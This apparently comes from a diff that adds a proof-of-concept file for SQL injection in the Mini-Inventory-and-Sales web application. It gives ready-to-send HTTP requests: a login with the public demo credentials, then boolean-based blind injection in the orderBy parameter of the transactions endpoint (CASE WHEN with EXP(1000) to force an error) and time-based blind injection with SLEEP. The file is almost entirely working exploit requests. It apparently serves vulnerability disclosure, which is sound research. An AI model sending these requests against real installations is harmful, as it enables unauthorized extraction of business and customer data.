@@ -1,0 +1,30 @@
+# Mini-Inventory-and-Sales SQL Injection - HTTP Requests
+
+## 1. Login (README public demo account)
+
+POST /index.php/home/login HTTP/1.1
+Host: <TARGET>
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+
+email=demo@1410inc.xyz&password=demopass
+
+Response: {"status":1}
+
+## 2. Boolean-based blind injection
+
+# condition TRUE -> HTTP 200 (data)
+GET /index.php/transactions/latr_?orderBy=(SELECT CASE WHEN 1=1 THEN 1 ELSE EXP(1000) END) HTTP/1.1
+Host: <TARGET>
+Cookie: <session>
+
+# condition FALSE -> HTTP 500 (Database Error)
+GET /index.php/transactions/latr_?orderBy=(SELECT CASE WHEN 1=2 THEN 1 ELSE EXP(1000) END) HTTP/1.1
+Host: <TARGET>
+Cookie: <session>
+
+## 3. Time-based blind (requires >=2 rows in result)
+
+GET /index.php/transactions/latr_?orderBy=(SELECT IF(1=1,SLEEP(2),0)) HTTP/1.1
+Host: <TARGET>
+Cookie: <session>
